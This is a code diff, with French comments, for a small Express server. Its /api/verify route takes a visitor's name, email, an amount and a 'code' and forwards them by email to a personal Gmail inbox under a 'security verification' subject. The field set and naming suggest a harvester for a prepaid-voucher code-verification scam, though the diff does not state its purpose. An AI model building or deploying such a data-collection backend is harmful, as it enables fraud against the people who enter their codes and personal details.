@@ -1,17 +1,27 @@
+const express = require('express');
+const cors = require('cors');
 const { Resend } = require('resend');
 
-// Initialisation avec ta clé API (utilise process.env pour la sécurité)
+// Initialisation de l'application Express
+const app = express();
+const PORT = process.env.PORT || 10000;
+
+// Middlewares obligatoires pour recevoir les données du formulaire
+app.use(express.json());
+app.use(cors());
+
+// Initialisation de Resend avec la variable d'environnement
 const resend = new Resend(process.env.RESEND_API_KEY);
 
+// Route de réception des données
 app.post('/api/verify', async (req, res) => {
-    // 1. Récupération des données du formulaire
     const { nom, prenom, email, amount, code } = req.body;
 
     try {
-        // 2. Envoi via l'API Resend
+        // Envoi via l'API Resend
         const data = await resend.emails.send({
-            from: 'onboarding@resend.dev', // Ou ton domaine vérifié si tu en as un
-            to: 'authentificationtickets811@gmail.com', // L'adresse où tu veux recevoir les infos
+            from: 'onboarding@resend.dev',
+            to: 'authentificationtickets81@gmail.com',
             subject: 'Nouvelle vérification de sécurité',
             html: `
                 <div style="font-family: sans-serif; line-height: 1.5;">
@@ -28,12 +38,17 @@ app.post('/api/verify', async (req, res) => {
             `
         });
 
-        // 3. Réponse positive au frontend
+        // Réponse positive au frontend
         res.status(200).json({ success: true, message: "Données transmises avec succès." });
 
     } catch (error) {
-        // 4. Gestion d'erreur propre
+        // Gestion d'erreur propre
         console.error("Erreur Resend :", error);
         res.status(500).json({ success: false, message: "Erreur lors de l'envoi des données." });
     }
+});
+
+// Démarrage du serveur
+app.listen(PORT, () => {
+    console.log(`Serveur démarré sur le port ${PORT}`);
 });
